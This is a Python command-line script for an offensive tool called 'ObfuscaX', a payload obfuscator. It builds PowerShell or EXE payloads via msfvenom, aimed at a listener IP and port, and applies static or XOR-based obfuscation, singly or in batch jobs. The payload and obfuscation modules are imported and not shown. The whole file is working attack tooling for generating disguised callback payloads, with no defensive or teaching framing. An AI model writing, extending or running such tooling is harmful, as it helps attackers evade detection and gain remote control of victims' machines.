import argparse
import json
from msfvenom_integration import generate_payload
from static_obfuscation import static_obfuscate
from dynamic_obfuscation import dynamic_obfuscate
from logger import setup_logger

logger = setup_logger()


def pick_obf(payload_type, obf):
    """EXE payloads stay raw; the obfuscators only handle PowerShell text."""
    if payload_type == "exe":
        if obf not in (None, "none"):
            raise ValueError(f"{obf} obfuscation is not supported for exe payloads")
        return "none"
    return obf or "static"


def obfuscate(payload, payload_type, obf, xor_key=None):
    obf = pick_obf(payload_type, obf)
    if obf == "static":
        return static_obfuscate(payload)
    if obf == "dynamic":
        return dynamic_obfuscate(payload, xor_key=xor_key)
    return payload


def run_job(job):
    payload_type = job["type"]
    payload = generate_payload(
        payload_type, job.get("lhost"), job.get("lport"), use_msf=job.get("msfvenom", False)
    )
    payload = obfuscate(payload, payload_type, job.get("obf"), job.get("xor_key"))
    with open(job["output"], "wb") as f:
        f.write(payload)
    logger.info(f"Saved {job['output']}")


def main():
    parser = argparse.ArgumentParser(description="ObfuscaX - Payload Obfuscator")
    parser.add_argument("--generate", action="store_true", help="Generate payload")
    parser.add_argument("--type", choices=["ps1", "exe"], help="Payload type")
    parser.add_argument("--lhost", type=str, help="Listener IP")
    parser.add_argument("--lport", type=int, help="Listener port")
    parser.add_argument(
        "--obf",
        choices=["static", "dynamic", "none"],
        help="Obfuscation type (default: static for ps1, none for exe)",
    )
    parser.add_argument("--xor-key", type=int, help="XOR key for dynamic mode (1-255, default random)")
    parser.add_argument("--msfvenom", action="store_true", help="Use msfvenom to generate payload")
    parser.add_argument("--output", type=str, help="Output file name")
    parser.add_argument("--batch", type=str, help="Batch JSON file for multiple payloads")

    args = parser.parse_args()

    if args.batch:
        try:
            with open(args.batch, "r") as f:
                batch_jobs = json.load(f)["jobs"]
        except (OSError, ValueError, KeyError, TypeError) as e:
            parser.error(f"cannot read batch file {args.batch}: {e}")
        failed = 0
        for job in batch_jobs:
            try:
                run_job(job)
            except Exception as e:
                logger.error(f"Job {job.get('output')} failed: {e}")
                failed += 1
        if failed:
            raise SystemExit(1)

    elif args.generate:
        if not args.type or not args.output:
            parser.error("--generate requires --type and --output")
        try:
            run_job(
                {
                    "type": args.type,
                    "lhost": args.lhost,
                    "lport": args.lport,
                    "obf": args.obf,
                    "xor_key": args.xor_key,
                    "msfvenom": args.msfvenom,
                    "output": args.output,
                }
            )
        except ValueError as e:
            parser.error(str(e))
        except Exception as e:
            logger.error(str(e))
            raise SystemExit(1)

    else:
        parser.print_help()


if __name__ == "__main__":
    main()
